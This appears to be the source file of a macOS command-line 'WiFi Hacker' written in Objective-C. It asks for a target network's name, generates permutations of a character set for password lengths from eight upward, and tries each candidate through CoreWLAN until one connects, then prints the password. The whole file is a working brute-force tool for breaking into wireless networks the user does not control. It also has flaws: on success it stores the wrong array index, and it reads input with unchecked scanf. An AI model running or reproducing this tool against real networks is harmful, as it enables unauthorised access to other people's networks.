//
//  main.m
//  WiFi
//
//  Created by Luka Kvavilashvili on 8/6/15.
//  Copyright (c) 2015 Luka Kvavilashvili. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <CoreWLAN/CoreWLAN.h>

static NSMutableArray *results;
NSString *password;

void doPermute(NSMutableArray *input, NSMutableArray *output, NSMutableArray *used, int size, int level) {
    if (size == level) {
        NSString *word = [output componentsJoinedByString:@""];
        [results addObject:word];
        return;
    }
    
    level++;
    
    for (int i = 0; i < input.count; i++) {
        if ([used[i] boolValue]) {
            continue;
        }
        used[i] = [NSNumber numberWithBool:YES];
        [output addObject:input[i]];
        doPermute(input, output, used, size, level);
        used[i] = [NSNumber numberWithBool:NO];
        [output removeLastObject];
    }
}

NSArray *getPermutations(NSString *input, int size) {
    results = [[NSMutableArray alloc] init];
    
    NSMutableArray *chars = [[NSMutableArray alloc] init];
    
    
    for (int i = 0; i < [input length]; i++) {
        NSString *ichar  = [NSString stringWithFormat:@"%c", [input characterAtIndex:i]];
        [chars addObject:ichar];
    }
    
    NSMutableArray *output = [[NSMutableArray alloc] init];
    NSMutableArray *used = [[NSMutableArray alloc] init];
    
    for (int i = 0; i < chars.count; i++) {
        [used addObject:[NSNumber numberWithBool:NO]];
    }
    
    doPermute(chars, output, used, size, 0);
    
    return results;
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // insert code here...
        CWInterface *wifi = [[CWWiFiClient sharedWiFiClient] interface];
        
        NSString *chars = @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!@#$%^&*()_+";
        
        char SSIDChars[99] = {"a"};
        char characters[99] = {""};
        int passwordMaxLength = 32;
        
        // get all inputs
        printf("Enter Password Max Length\n");
        scanf("%d",&passwordMaxLength);
        printf("Enter target WiFi's SSID (name)\n");
        scanf("%s",SSIDChars);
        printf("Enter characters (no separator) to use while generating strings. Enter 0 if you want to use default characters (takes more time)\n");
        scanf("%s",characters);
        
        NSString *connectToThisSSID = [NSString stringWithUTF8String:SSIDChars];
        NSString *inputedChars = [NSString stringWithUTF8String:characters];
        
        if (![inputedChars isEqualToString:@"0"]) {
            chars = inputedChars;
        }
        
        NSLog(@"Initialized WiFi Hacker with max password length per password check of - %d. And with target name of - %@",passwordMaxLength, connectToThisSSID);
        
        
        NSLog(@"Getting WiFi List");
        NSSet *networks = [wifi scanForNetworksWithName:nil error:nil];
        NSError *error = nil;
        CWNetwork *connectToThisNetwork = nil;
        
        NSLog(@"Checking for existance of %@",connectToThisSSID);
        for (CWNetwork *currWifi in networks) {
            if([currWifi.ssid isEqualToString:connectToThisSSID]){
                connectToThisNetwork = currWifi;
            }
        }
        
        
        if(connectToThisNetwork == nil){
            NSLog(@"The WiFi %@ is not in range, or doesn't exist. Make sure you spelled the name correctly.",connectToThisSSID);
            return 0;
        }
        else {
            NSLog(@"Checking WiFi was successful.\n\n");
        }
        
        for(int i = 8; i < passwordMaxLength; i++){
            NSLog(@"Generating all permutations of chars for string length of %i. This might take a while!",i);
            NSArray *permutations = getPermutations(chars, i);
            NSLog(@"Successfully generated %lu strings. Attempting each of them as password",permutations.count);
            for(int k = 0; k < permutations.count; k++){
                [wifi associateToNetwork:connectToThisNetwork password:permutations[k] error:&error];
                if(error == nil){
                    NSLog(@"The Password Is - %@",permutations[k]);
                    password = permutations[i];
                    break;
                }
                else {
                    error = nil;
                    NSLog(@"%i / %lu - %@",k,[permutations count], [permutations objectAtIndex:k]);
                }
            }
            if(password != nil){
                break;
            }
            NSLog(@"None of the passwords for length of %i matched the real password. Moving on",i);
        }
    }
    return 0;
}
